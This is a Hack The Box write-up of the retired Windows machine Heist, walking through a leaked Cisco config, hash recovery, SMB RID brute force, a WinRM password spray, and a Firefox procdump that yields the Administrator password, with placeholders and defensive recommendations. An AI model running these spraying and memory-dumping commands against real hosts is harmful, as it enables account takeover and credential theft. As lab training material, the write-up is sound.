---
title: "Heist — Cisco Config Leak to Firefox Credential Extraction"
description: "A leaked Cisco configuration yields SMB and WinRM access, then Firefox process memory recovery exposes the Administrator password."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - credential-reuse
  - process-dump
---

## Summary

Heist is a retired Easy Windows machine on Hack The Box. A guest-accessible support portal exposes a Cisco router configuration file containing reversible type 7 and cracked type 5 password hashes. Recovered credentials grant SMB access as `<LOW_PRIVILEGE_USER>`, enabling RID brute force to discover additional local accounts. Password spraying yields a WinRM shell as `<WINRM_USER>`. A `todo.txt` note and running Firefox process point to an active browser session; dumping Firefox process memory reveals the Administrator password in plaintext form from a submitted login URL. WinRM access as `Administrator` completes the machine. All IPs and credential values below are replaced with role-based placeholders.

## Context and Objective

The target presents an IIS web server with a support ticket portal, SMB on port 445, and WinRM on port 5985. Guest access to the portal is available without authentication. The objective is to identify an attack path from guest-level portal access to full Administrator compromise on the Windows host.

## Approach and Evidence

### Stage 1 — Guest Portal Access and Cisco Configuration Extraction

Guest login to the support portal redirects to an issues tracker page. An attachment link provides direct access to a Cisco router configuration file without further authentication.

```text
GET /login.php?guest=true → 302 → issues.php
GET /attachments/config.txt → 200 (Cisco config contents)
```

The configuration contains three credential artifacts: a Cisco type 5 MD5-crypt enable secret, and two Cisco type 7 reversible passwords for accounts `rout3r` and `admin`.

### Stage 2 — Cisco Credential Recovery

Cisco type 7 passwords use a reversible algorithm. Both values were decoded to plaintext equivalents.

```bash
python3 -c "from passlib.hash import cisco_type7; print(cisco_type7.decode('<TYPE7_HASH>'))"
```

The type 5 enable secret was cracked with a dictionary attack using John the Ripper with the md5crypt format, yielding a third credential. This produced three recovered passwords mapped to the accounts `rout3r`, `admin`, and the enable secret.

### Stage 3 — SMB Access and RID Brute Force

Testing the cracked enable secret against the visible issue author username `<LOW_PRIVILEGE_USER>` produced a valid SMB authentication.

```bash
nxc smb <TARGET_IP> -u <LOW_PRIVILEGE_USER> -p '<RECOVERED_PASSWORD>'
```

```text
[+] <TARGET_DOMAIN>\<LOW_PRIVILEGE_USER>:<RECOVERED_PASSWORD>
```

Authenticated SMB access enabled RID brute force enumeration, revealing additional local user accounts including `<WINRM_USER>` and `<ADDITIONAL_USER>`.

```bash
nxc smb <TARGET_IP> -u <LOW_PRIVILEGE_USER> -p '<RECOVERED_PASSWORD>' --rid-brute
```

```text
<RID>: <TARGET_DOMAIN>\<LOW_PRIVILEGE_USER> (SidTypeUser)
<RID>: <TARGET_DOMAIN>\<SUPPORT_USER> (SidTypeUser)
<RID>: <TARGET_DOMAIN>\<WINRM_USER> (SidTypeUser)
<RID>: <TARGET_DOMAIN>\<ADDITIONAL_USER> (SidTypeUser)
```

### Stage 4 — Password Spray to WinRM

Spraying the three recovered passwords against the discovered usernames over WinRM produced a valid login as `<WINRM_USER>`.

```bash
nxc winrm <TARGET_IP> -u users.txt -p passwords.txt --continue-on-success
```

```text
[+] <TARGET_DOMAIN>\<WINRM_USER>:<RECOVERED_PASSWORD> (Pwn3d!)
```

The `<WINRM_USER>` account had a WinRM login shell, providing user-level access to the host.

### Stage 5 — Local Enumeration and Firefox Process Targeting

Post-exploitation enumeration as `<WINRM_USER>` revealed a `todo.txt` on the desktop indicating the user actively monitors the support portal. A process listing showed multiple Firefox instances running under the `<WINRM_USER>` user context.

```bash
nxc winrm <TARGET_IP> -u <WINRM_USER> -p '<WINRM_PASSWORD>' -x 'Get-Process | Select-Object Id,ProcessName,Path | Format-Table -AutoSize'
```

```text
Id    ProcessName  Path
6368  firefox      C:\Program Files\Mozilla Firefox\firefox.exe
6476  firefox      C:\Program Files\Mozilla Firefox\firefox.exe
```

The combination of the todo note and running browser process indicated a high likelihood of stored credentials in browser memory.

### Stage 6 — Firefox Process Dump and Administrator Credential Extraction

`procdump` was used to capture a full memory dump of a Firefox process. The dump was transferred to the attacker host via an SMB share.

```bash
procdump.exe -ma firefox.exe firefox.dmp
```

Searching the dump for the login form parameter `login_password` revealed a plaintext URL containing the Administrator password.

```bash
strings -el firefox.dmp | grep -i 'login_password'
```

```text
<TARGET_HOST>/login.php?login_username=<ADMIN_USER>@<TARGET_DOMAIN>&login_password=<ADMIN_PASSWORD>&login=
```

The extracted credential provided valid WinRM access as `Administrator`, completing full privilege escalation.

```bash
nxc winrm <TARGET_IP> -u administrator -p '<ADMIN_PASSWORD>'
```

```text
[+] <TARGET_DOMAIN>\administrator:<ADMIN_PASSWORD> (Pwn3d!)
```

## Challenges and Decisions

The Cisco type 7 passwords were immediately reversible, requiring no external cracking resources. The enable secret required dictionary-based cracking but was fast against common wordlists. The critical decision was to pivot from web portal findings to SMB enumeration and then password spray, since the leaked credentials did not work against the web login form directly. Identifying the Firefox process as a credential source required correlating the todo.txt hint with the process listing; a blind process dump without that context would have been less targeted.

## Outcome

The evidence establishes a complete unauthenticated-to-Administrator attack chain through credential leakage and process memory exposure. The path relied on a misconfigured guest portal exposing network device credentials, password reuse across web and Windows accounts, and a privileged user storing credentials in an active browser session. No kernel exploit or unpatched software vulnerability was required.

## Lessons and Recommendations

- Cisco type 7 passwords are reversible by design and should be treated as plaintext-equivalent. Migrate to type 8 (PBKDF2-SHA256) or type 9 (scrypt) password hashing.
- Sensitive network device configurations must not be exposed through guest-accessible portals or support ticket attachments. Implement access controls and audit attachment exposure.
- Password reuse across infrastructure devices and Windows domain accounts creates lateral movement paths. Use unique credentials for each system tier.
- RID brute force enumeration with any valid SMB account reveals the full local user list. Restrict low-privileged users from performing SAM enumeration where possible.
- Browser process memory may contain plaintext credentials from form submissions. Avoid logging into administrative interfaces from shared or monitored user sessions; consider credential isolation and browser hardening.
- Monitoring for unusual process dump activity (e.g., `procdump` targeting browser processes) can detect this class of credential theft at the endpoint level.

## References

- Hack The Box — [Heist](https://app.hackthebox.com/machines/Heist) (retired Windows machine)
